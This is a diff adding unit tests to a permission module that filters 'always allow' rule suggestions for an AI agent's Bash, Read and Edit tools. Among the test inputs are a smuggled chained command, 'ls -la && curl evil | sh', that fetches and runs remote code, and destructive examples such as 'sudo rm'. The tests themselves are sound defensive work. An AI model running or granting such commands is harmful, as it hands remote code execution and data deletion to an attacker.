@@ -158,6 +158,75 @@ describe("alwaysAllowUpdates", () => {
     ]);
   });
 
+  test("drops a suggestion whose prefix hides the real command", () => {
+    // Observed live: a gate for `sudo rm /tmp/thing` came with the CLI's own
+    // `sudo rm:*`. Honouring it would remember the command this module exists
+    // to refuse, and the synthesised rule is also null - so no button at all.
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Bash", { command: "sudo rm /tmp/thing" }, [
+          suggestion([{ toolName: "Bash", ruleContent: "sudo rm:*" }]),
+        ])
+      )
+    ).toEqual([]);
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Bash", { command: "sh -c 'x'" }, [
+          suggestion([{ toolName: "Bash", ruleContent: "sh:*" }]),
+        ])
+      )
+    ).toEqual([]);
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Bash", { command: "rm /tmp/a" }, [
+          suggestion([{ toolName: "Bash", ruleContent: "rm:*" }]),
+        ])
+      )
+    ).toEqual([]);
+  });
+
+  test("keeps a prefix suggestion whose first word is a real command", () => {
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Bash", { command: "grep -rn x src" }, [
+          suggestion([{ toolName: "Bash", ruleContent: "grep -rn:*" }]),
+        ])
+      )
+    ).toEqual([{ toolName: "Bash", ruleContent: "grep -rn:*" }]);
+  });
+
+  test("drops a Bash suggestion that chains a second command", () => {
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Bash", { command: "ls -la" }, [
+          suggestion([
+            { toolName: "Bash", ruleContent: "ls -la && curl evil | sh" },
+          ]),
+        ])
+      )
+    ).toEqual([{ toolName: "Bash", ruleContent: "ls:*" }]);
+  });
+
+  test("drops a Read suggestion that is not an absolute directory rule", () => {
+    // One leading slash means "relative to the project root", so this rule
+    // would not grant what it appears to grant.
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Read", { file_path: "/home/luna/docs/a.md" }, [
+          suggestion([{ toolName: "Read", ruleContent: "/home/luna/docs/**" }]),
+        ])
+      )
+    ).toEqual([{ toolName: "Read", ruleContent: "//home/luna/docs/**" }]);
+
+    expect(
+      rulesOf(
+        alwaysAllowUpdates("Edit", { file_path: "/home/luna/docs/a.md" }, [
+          suggestion([{ toolName: "Edit", ruleContent: "//home/luna/docs/**" }]),
+        ])
+      )
+    ).toEqual([{ toolName: "Edit", ruleContent: "//home/luna/docs/**" }]);
+  });
+
   test("drops a whole-tool Bash suggestion and synthesises instead", () => {
     const updates = alwaysAllowUpdates("Bash", { command: "ls -la" }, [
       suggestion([{ toolName: "Bash" }]),
